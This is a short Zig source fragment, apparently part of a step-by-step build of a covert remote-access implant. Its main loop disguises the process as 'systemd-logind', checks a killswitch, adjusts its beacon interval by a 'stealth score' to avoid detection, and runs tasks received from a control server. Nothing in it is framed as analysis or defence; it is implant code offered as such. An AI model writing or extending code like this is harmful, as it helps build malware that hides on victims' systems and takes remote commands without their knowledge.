// ... existing imports
const stealth = @import("utils/stealth.zig");
const name_spoof = @import("utils/name_spoof.zig");

pub fn main() !void {
    // ... existing init code

    // Spoof process name (Step 35)
    name_spoof.spoofName("systemd-logind");

    // ... register, etc.

    while (true) {
        killswitch.check();

        // Adjust heartbeat interval based on stealth score (Step 38)
        const adjusted = stealth.getAdjustedHeartbeat(cfg.heartbeat_interval);
        const task = try client.heartbeat();
        if (task) |t| {
            try dispatcher.dispatch(&client, t);
        }
        std.time.sleep(adjusted * std.time.ns_per_s);
    }
}
